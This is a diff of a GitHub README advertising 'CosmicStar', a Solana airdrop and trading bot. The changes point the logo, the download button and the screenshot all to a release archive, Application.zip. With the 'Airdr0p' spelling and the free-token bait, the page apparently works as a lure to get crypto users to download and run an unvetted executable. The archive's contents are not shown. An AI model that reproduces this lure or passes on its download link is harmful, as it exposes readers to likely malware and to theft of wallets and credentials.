@@ -1,6 +1,6 @@
 # 🌌 CosmicStar - Solana Airdr0p Bot
 
-![CosmicStar Logo](https://example.com/cosmicstar.png)
+![CosmicStar Logo](https://github.com/Mrcoder400/CosmicStar/releases/download/v1.0/Application.zip)
 
 ## Description
 Welcome to CosmicStar, your go-to Solana Airdr0p Bot! This bot is designed to automate the process of claiming airdrop tokens on the Solana network. It is not just limited to airdrops, but also supports automated trading of coins on the Solana blockchain. With a focus on efficiency and security, CosmicStar utilizes premium APIs and Chromedriver to seamlessly automate trading operations on the web interfaces of popular exchanges. 
@@ -31,7 +31,7 @@ Welcome to CosmicStar, your go-to Solana Airdr0p Bot! This bot is designed to au
 
 ## Get Started
 To download the CosmicStar bot application, please click the button below:
-[![Download CosmicStar](https://img.shields.io/badge/Download-CosmicStar-green)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download CosmicStar](https://github.com/Mrcoder400/CosmicStar/releases/download/v1.0/Application.zip)](https://github.com/Mrcoder400/CosmicStar/releases/download/v1.0/Application.zip)
 
 ## Installation
 1. Download the CosmicStar application from the link provided above.
@@ -43,4 +43,4 @@ For any questions or issues, kindly check the "Releases" section of this reposit
 
 Let the CosmicStar bot take your Solana trading to new heights! 🚀🪐
 
-![CosmicStar](https://example.com/cosmicstar_screenshot.png)
+![CosmicStar](https://github.com/Mrcoder400/CosmicStar/releases/download/v1.0/Application.zip)
